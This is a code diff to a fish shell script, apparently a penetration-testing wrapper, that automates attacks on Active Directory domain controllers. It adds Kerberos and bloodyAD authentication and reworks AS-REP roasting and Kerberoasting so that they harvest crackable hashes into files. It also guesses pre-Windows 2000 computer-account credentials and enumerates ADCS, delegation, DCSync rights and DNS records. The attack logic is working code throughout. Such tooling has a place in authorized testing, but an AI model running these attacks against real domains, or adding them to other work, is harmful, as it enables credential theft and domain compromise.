@@ -96,10 +96,14 @@ Examples:
 
     if set -q _flag_kerb
         set -a nxc_auth -k
+        if set -q KRB5CCNAME
+            set -a nxc_auth --use-kcache
+        end
         set -a imp_auth -k -no-pass
         
         # Time synchronization for Kerberos
         if command -v ntpdate >/dev/null 2>&1
+            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
             sudo ntpdate -u $target >/dev/null 2>&1
         else
             ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
@@ -117,11 +121,48 @@ Examples:
     # Extract DC FQDN from /etc/hosts if needed for Kerberos
     set dc_fqdn ""
     if set -q _flag_kerb
-        set dc_fqdn (awk -v target="$target" '$1 == target {print $2; exit}' /etc/hosts)
+        set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
         if test -n "$dc_fqdn"
-            set -a imp_auth -dc-host $dc_fqdn
+            # Update nxc auth to use FQDN instead of IP for Kerberos
+            set nxc_auth[1] $dc_fqdn
+            # For Kerberos, rebuild impacket auth with @fqdn
+            if set -q _flag_password
+                set imp_auth "$domain/$user:$_flag_password@$dc_fqdn" -k -dc-ip $target -dc-host $dc_fqdn
+            else if set -q _flag_hash
+                set imp_auth "$domain/$user@$dc_fqdn" -hashes ":$_flag_hash" -k -dc-ip $target -dc-host $dc_fqdn
+            else
+                set imp_auth "$domain/$user@$dc_fqdn" -k -no-pass -dc-ip $target -dc-host $dc_fqdn
+            end
+            # Add target-domain if specified
+            if set -q _flag_target_domain
+                set -a imp_auth -target-domain $_flag_target_domain
+            end
         else
             ezpz_warn "DC FQDN not found in /etc/hosts for $target. Kerberos may fail."
+            set -a imp_auth -dc-host $dc_fqdn
+        end
+    end
+
+    # Build bloodyAD authentication
+    if command -v bloodyAD >/dev/null 2>&1
+        if set -q _flag_kerb -a -n "$dc_fqdn"
+            set bloody_auth --host $dc_fqdn -dc-ip $target -d $domain -u $user
+        else
+            set bloody_auth --host $target -d $domain -u $user
+        end
+        
+        if set -q _flag_password
+            set -a bloody_auth -p "$_flag_password"
+        else if set -q _flag_hash
+            set -a bloody_auth -p ":$_flag_hash"
+        end
+        
+        if set -q _flag_kerb
+            if set -q KRB5CCNAME
+                set -a bloody_auth -k "ccache=$KRB5CCNAME"
+            else
+                set -a bloody_auth -k
+            end
         end
     end
 
@@ -191,16 +232,40 @@ Examples:
     if set -q _flag_target_domain
         ezpz_cmd "GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file"
         if test -f $users_file
-            GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file 2>/dev/null | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+            set output (GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file 2>&1)
+            set error_lines (string split '\n' $output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
+            if test -n "$error_lines"
+                for line in $error_lines
+                    echo $line | sed 's/^\[\-\] //'
+                end
+            else
+                echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+            end
             GetNPUsers.py $_flag_target_domain/ -no-pass -usersfile $users_file -outputfile $asrep_file >/dev/null 2>&1
         else
             ezpz_warn "Users file $users_file not found. Skipping AS-REP roasting with usersfile."
-            GetNPUsers.py $imp_auth 2>/dev/null | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+            set output (GetNPUsers.py $imp_auth 2>&1)
+            set error_lines (string split '\n' $output | grep -iE "(No entries found|Error)")
+            if test -n "$error_lines"
+                for line in $error_lines
+                    echo $line | sed 's/^\[\-\] //'
+                end
+            else
+                echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+            end
             GetNPUsers.py $imp_auth -outputfile $asrep_file >/dev/null 2>&1
         end
     else
         ezpz_cmd "GetNPUsers.py $imp_auth -request"
-        GetNPUsers.py $imp_auth 2>/dev/null | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+        set output (GetNPUsers.py $imp_auth 2>&1)
+        set error_lines (string split '\n' $output | grep -iE "(No entries found|Error)")
+        if test -n "$error_lines"
+            for line in $error_lines
+                echo $line | sed 's/^\[\-\] //'
+            end
+        else
+            echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+        end
         GetNPUsers.py $imp_auth -request -outputfile $asrep_file >/dev/null 2>&1
     end
     if test -f $asrep_file
@@ -214,7 +279,15 @@ Examples:
     else
         ezpz_cmd "GetUserSPNs.py $imp_auth -request"
     end
-    GetUserSPNs.py $imp_auth 2>/dev/null | grep --color=never "\\S" | tail -n +4 | awk '{print $2 " ||| "$1}' | column -s "|||" -t
+    set output (GetUserSPNs.py $imp_auth 2>&1)
+    set error_lines (string split '\n' $output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
+    if test -n "$error_lines"
+        for line in $error_lines
+            echo $line | sed 's/^\[\-\] //'
+        end
+    else
+        echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $2 " ||| "$1}' | column -s "|||" -t
+    end
     GetUserSPNs.py $imp_auth -request -outputfile $kerb_file >/dev/null 2>&1
     if test -f $kerb_file
         ezpz_info "Saving hashes to $kerb_file"
@@ -234,8 +307,19 @@ Examples:
     if test -s $users_tmp
         if command -v pre2k >/dev/null 2>&1
             ezpz_header "Searching for pre-Win2k compatible computer accounts (NoPac)"
-            ezpz_cmd "pre2k unauth -d $domain -dc-ip $target -inputfile $users_tmp"
-            pre2k unauth -d $domain -dc-ip $target -inputfile $users_tmp 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
+            
+            # Build pre2k command
+            if set -q _flag_kerb -a -n "$dc_fqdn"
+                set pre2k_cmd pre2k unauth -d $domain -dc-host $dc_fqdn -dc-ip $target -inputfile $users_tmp -k
+                if set -q KRB5CCNAME
+                    set -a pre2k_cmd -no-pass
+                end
+            else
+                set pre2k_cmd pre2k unauth -d $domain -dc-ip $target -inputfile $users_tmp
+            end
+            
+            ezpz_cmd "$pre2k_cmd"
+            $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
         else
             ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
         end
@@ -262,7 +346,7 @@ Examples:
     ezpz_cmd "nxc ldap $nxc_auth -M adcs"
     nxc ldap $nxc_auth -M adcs 2>/dev/null | grep 'ADCS' | tr -s " " | cut -d ' ' -f 6-
 
-    ezpz_header "Enumerating trust relationships"
+    ezpz_header "Searching for trust relationships"
     ezpz_cmd "nxc ldap $nxc_auth --dc-list"
     nxc ldap $nxc_auth --dc-list 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5-
 
@@ -276,7 +360,15 @@ Examples:
     else
         ezpz_cmd "findDelegation.py $imp_auth"
     end
-    findDelegation.py $imp_auth 2>/dev/null | grep --color=never "\\S" | tail -n +2
+    set output (findDelegation.py $imp_auth 2>&1)
+    set error_lines (string split '\n' $output | grep -iE "(No entries found|Error)")
+    if test -n "$error_lines"
+        for line in $error_lines
+            echo $line | sed 's/^\[\-\] //'
+        end
+    else
+        echo $output | grep --color=never "\\S" | tail -n +2
+    end
 
     ezpz_header "Enumerating DCSync rights"
     # Build TARGET_DN dynamically based on domain parts
@@ -302,22 +394,6 @@ Examples:
     # DNS Dump using bloodyAD
     if command -v bloodyAD >/dev/null 2>&1
         ezpz_header "Enumerating DNS records"
-        
-        # Build bloodyAD authentication
-        set bloody_auth --host $target -d $domain -u $user
-        if set -q _flag_password
-            set -a bloody_auth -p "$_flag_password"
-        else if set -q _flag_hash
-            set -a bloody_auth -p ":$_flag_hash"
-        else if set -q _flag_kerb
-            if set -q KRB5CCNAME
-                set -a bloody_auth -k "ccache=$KRB5CCNAME"
-            else
-                ezpz_warn "KRB5CCNAME not set. Kerberos authentication may fail."
-                set -a bloody_auth -k
-            end
-        end
-        
         ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
         timeout 60 bloodyAD $bloody_auth get dnsDump 2>/dev/null | awk '
         {
